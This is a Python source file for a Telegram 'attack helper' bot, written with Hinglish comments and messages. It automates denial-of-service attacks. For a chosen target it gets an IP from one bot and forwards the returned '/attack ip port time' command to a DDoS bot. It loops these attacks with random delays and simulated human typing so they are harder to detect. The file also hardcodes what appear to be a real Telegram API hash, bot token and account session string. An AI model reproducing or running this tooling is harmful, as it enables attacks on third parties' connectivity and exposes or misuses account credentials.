import asyncio
import re
import random
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

API_ID = 35284354
API_HASH = "1369f6f5653d5589b735def06a23703c"
BOT_TOKEN = "8489391478:AAFn0e-HJplScgnrZ5YH0f2Gc8Q1KO9VeyQ"

BOT_A = "@botbysahilbot"          # IP BOT
BOT_B = "@DDOS_Aditya_xd_bot"     # Attack BOT

STRING_SESSION = "1BVtsOKEBuwrK8qxvmy15Glw3WMpdO6sLWyYPWJrT_srehGTLqvYQ-h79-TY6GRqf9JfkAHjjzeN2HK-EWRJBlZnep2DpbOSNaqnDGQr3vjlGK9HY42PNWQWopuw-NKcFYkQkL5aTNmhLw9oIgj0Yv1dCxEVIsK1RlDz8MeV3gw3NOOBO_ugSSiNwQWm9p-LLxDNirZrGBHsPu6ldDZx3ugqYbjqq1lZqBX30-VA_iPxbe-tCfHAJYAuKFsgH17iB-Q5f4HsKYQWGqx2ifgnDXsZhbtlfj7SkU16c4GJzicV9fuKMcJLhjbC2Gt48chDdtShhyBilakU0beFCt4EhgyAxccsPUI="

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

# --------- STATE ---------

chat_targets: dict[int, str] = {}
chat_counts: dict[int, int] = {}
ip_waiters: dict[int, asyncio.Future] = {}
bot_b_status = "UNKNOWN"

auto_tasks: dict[int, asyncio.Task] = {}   # har chat ka autoloop task
BASE_DELAY = 60                            # attacks ke beech fixed 1 min


# ---------- HELPERS (human-like) ----------

async def human_sleep(min_s: float, max_s: float):
    await asyncio.sleep(random.uniform(min_s, max_s))

async def human_type_and_send(context: ContextTypes.DEFAULT_TYPE, chat_id: int, text: str):
    t = min(5, max(0.7, len(text) * 0.03 + random.uniform(-0.3, 0.5)))
    await context.bot.send_chat_action(chat_id, "typing")
    await asyncio.sleep(t)
    await context.bot.send_message(chat_id, text)


# ---------- LISTENERS ----------

@tele.on(events.NewMessage(from_users=BOT_A))
async def ip_bot_listener(event):
    text = event.text or ""
    print("📩 IP BOT REPLY:", repr(text))

    # CMD: line dhoondo
    m_line = re.search(r"CMD:(.+)", text, flags=re.IGNORECASE)
    if not m_line:
        return

    line = m_line.group(1).strip()

    # backticks ke andar se command
    m_cmd = re.search(r"`([^`]+)`", line)
    if m_cmd:
        raw_cmd = m_cmd.group(1).strip()
    else:
        raw_cmd = line.lstrip("* ").strip()

    # /attack ip port time pattern
    m_attack = re.search(r"(/attacks+S+s+S+s+S+)", raw_cmd)
    if m_attack:
        final_cmd = m_attack.group(1).strip()
    else:
        final_cmd = raw_cmd

    print("✅ FINAL CMD:", final_cmd)

    await human_sleep(0.4, 1.2)

    for chat_id, fut in list(ip_waiters.items()):
        if not fut.done():
            fut.set_result(final_cmd)
        ip_waiters.pop(chat_id, None)


@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    global bot_b_status
    text = event.text or ""
    low = text.lower()
    print("DDOS BOT MSG:", repr(text))

    if "ready" in low and ("no attack running" in low or "you can start a new attack" in low):
        bot_b_status = "READY"
    elif (
        "attack started" in low
        or "starting attack" in low
        or "attack running" in low
        or "ᴀᴛᴛᴀᴄᴋ sᴛᴀʀᴛᴇᴅ" in text
        or "sᴛᴀʀᴛɪɴɢ ᴀᴛᴛᴀᴄᴋ" in text
        or "ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
    ):
        bot_b_status = "RUNNING"
    elif "cooldown" in low or "⏳" in text:
        bot_b_status = "COOLDOWN"


# ---------- SINGLE ROUND ----------

async def single_round(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    target = chat_targets.get(chat_id)
    if not target:
        await human_type_and_send(
            context,
            chat_id,
            "❌ Pehle /setlinkchatid se target set karo."
        )
        return

    await human_type_and_send(
        context,
        chat_id,
        f"➡️ Thoda ruk, `{target}` ka IP nikal raha hu…"
    )

    loop = asyncio.get_running_loop()
    fut = loop.create_future()
    ip_waiters[chat_id] = fut

    await human_sleep(0.8, 2.0)
    await tele.send_message(BOT_A, f".getip all {target}")

    try:
        final_cmd = await asyncio.wait_for(fut, timeout=60)
    except asyncio.TimeoutError:
        await human_type_and_send(
            context,
            chat_id,
            "⏱️ IP BOT reply nahi diya, ye attack skip kar raha hu."
        )
        ip_waiters.pop(chat_id, None)
        return

    await human_type_and_send(
        context,
        chat_id,
        f"📥 IP BOT ne ye CMD diya:`{final_cmd}`"
    )

    await human_sleep(1.0, 3.0)
    await tele.send_message(BOT_B, final_cmd)

    await human_type_and_send(
        context,
        chat_id,
        f"🚀 DDOS BOT ko bhej diya:`{final_cmd}`"
    )


# ---------- AUTO LOOP WORKER (task) ----------

async def autoloop_worker(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    count = chat_counts.get(chat_id, 1)

    await human_type_and_send(
        context,
        chat_id,
        f"🔁 Auto loop start kar raha hu.Attacks: {count}Base delay: {BASE_DELAY}s + human typing."
    )

    try:
        for i in range(count):
            await human_type_and_send(
                context,
                chat_id,
                f"▶️ Attack {i + 1}/{count} shuru karte hain…"
            )

            await single_round(chat_id, context)

            if i == count - 1:
                break

            # yahan tak agar stop aaya to CancelledError raise ho jayega
            jitter = random.randint(0, 30)
            total_delay = BASE_DELAY + jitter

            await human_type_and_send(
                context,
                chat_id,
                f"⏳ Next attack se pehle ~{total_delay}s wait karunga…"
            )

            # per-second check nahi chahiye, cancel directly sleep pe lagega
            await asyncio.sleep(total_delay)

    except asyncio.CancelledError:
        await human_type_and_send(
            context,
            chat_id,
            "🛑 Auto loop force stop ho gaya (stop command se)."
        )
        raise
    finally:
        auto_tasks.pop(chat_id, None)
        await human_type_and_send(context, chat_id, "✅ Auto loop khatam ho gaya.")


# ---------- COMMAND HANDLERS ----------

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
👋 Hey, main attack helper bot hu.

Commands:
/setlinkchatid <link_or_chatid>  - Target group/chat set karo
/setcount <number_of_attacks>   - Kitne attacks chahiye
/startloop                      - Ek single attack
/autoloop                       - Auto attacks (human-like)
/stoploop                       - Auto loop turant band karo
"""
    await human_type_and_send(context, update.effective_chat.id, text.strip())


async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /setlinkchatid <group_link_or_chatid>")
        return
    chat_targets[update.effective_chat.id] = " ".join(context.args)
    await human_type_and_send(context, update.effective_chat.id, "✅ Target save kar liya.")


async def setcount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /setcount <number_of_attacks>")
        return
    n = max(1, int(context.args[0]))
    chat_counts[update.effective_chat.id] = n
    await human_type_and_send(context, update.effective_chat.id, f"✅ Attack count {n} set kar diya.")


async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await single_round(update.effective_chat.id, context)


async def autoloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if chat_id in auto_tasks:
        await update.message.reply_text("⚠️ Auto loop already chal raha hai.")
        return

    task = asyncio.create_task(autoloop_worker(chat_id, context))
    auto_tasks[chat_id] = task
    await update.message.reply_text("🔁 Auto loop task start kar diya.")


async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    task = auto_tasks.get(chat_id)

    if task:
        task.cancel()
        await update.message.reply_text(
            "🛑 Stop signal bhej diya, thodi der me loop band ho jayega."
        )
    else:
        await update.message.reply_text("ℹ️ Is chat me koi auto loop nahi chal raha.")


# ---------- MAIN ----------

async def main():
    await tele.start()
    print("🧵 Telethon connected")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("setlinkchatid", setlink))
    app.add_handler(CommandHandler("setcount", setcount))
    app.add_handler(CommandHandler("startloop", startloop))
    app.add_handler(CommandHandler("autoloop", autoloop))
    app.add_handler(CommandHandler("stoploop", stoploop))

    print("🤖 Control bot running")
    await app.initialize()
    await app.start()
    await app.updater.start_polling()

    await tele.run_until_disconnected()


if __name__ == "__main__":
    asyncio.run(main())